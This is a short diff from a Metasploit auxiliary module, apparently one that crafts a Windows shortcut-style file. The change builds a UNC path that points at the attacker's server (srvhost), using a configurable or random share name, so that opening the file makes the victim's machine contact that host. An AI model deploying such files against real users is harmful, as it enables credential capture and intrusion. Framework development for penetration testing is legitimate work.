@@ -141,7 +141,9 @@ class MetasploitModule < Msf::Auxiliary
     data += [env_block_sig].pack('V')
 
     # Target field in ANSI (260 bytes)
-    unc_path = get_unc_path
+    unc_share = datastore['SHARE']
+    unc_share = Rex::Text.rand_text_alphanumeric(6) if unc_share.blank?
+    unc_path = "\\\\#{srvhost}\\#{unc_share}"
 
     # Create fixed-size ANSI buffer with nulls
     ansi_buffer = "\x00".b * 260
